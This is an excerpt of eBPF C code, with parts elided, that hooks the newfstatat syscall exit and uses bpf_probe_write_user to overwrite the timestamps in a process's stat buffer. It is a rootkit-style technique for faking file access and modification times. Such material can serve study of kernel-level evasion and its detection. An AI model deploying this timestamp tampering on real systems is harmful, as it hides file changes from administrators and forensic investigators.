...
int handle_exit_newfstatat(struct trace_event_raw_sys_exit *ctx) {
  ...
  long success = bpf_probe_read_user(&file_times_buf, sizeof(struct file_times),
                                     stat_p + 72);
  ...
  bpf_printk("[sys_exit_newfstatat] OVERWRITING stat.(st_atime, st_mtime, "
             "st_ctime) at %p from (%d, %d, %d) to (%d, %d, %d)",
             stat_p, file_times_buf.st_atime, file_times_buf.st_mtime,
             file_times_buf.st_ctime, replace_file_times.st_atime,
             replace_file_times.st_mtime, replace_file_times.st_ctime);
  success = bpf_probe_write_user((char *)stat_p + 72,
                                 (char *)&replace_file_times, 32);
